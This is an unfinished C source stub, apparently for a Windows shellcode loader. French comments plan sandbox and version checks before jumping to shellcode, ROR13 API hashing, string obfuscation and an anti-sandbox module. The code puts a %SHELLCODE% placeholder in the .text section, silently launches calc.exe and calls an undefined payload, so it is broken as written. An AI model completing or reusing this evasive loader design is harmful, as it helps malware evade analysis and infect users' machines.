#include <windows.h>
// #include <config.h>

/*
https://asecuritysite.com/hash/ror13

Code C qui recup ino si sandbbox et versions
si oui jump sur shellcode

à faire : 
shellcode
changer hash ROR13 par autre chose
hasher les strings avec quelquechose

archi : 

comp.sh
loader.c
anti-s.c (pays, disquedur (nom,taille)...)

*/

__attribute__((section(".text"))) %SHELLCODE%

int WINAPI() {
    ShellExecute(0, "open", "calc.exe", 0, 0, SW_HIDE);
    ((void (*)())msgbox_payload)();
    return 0;
}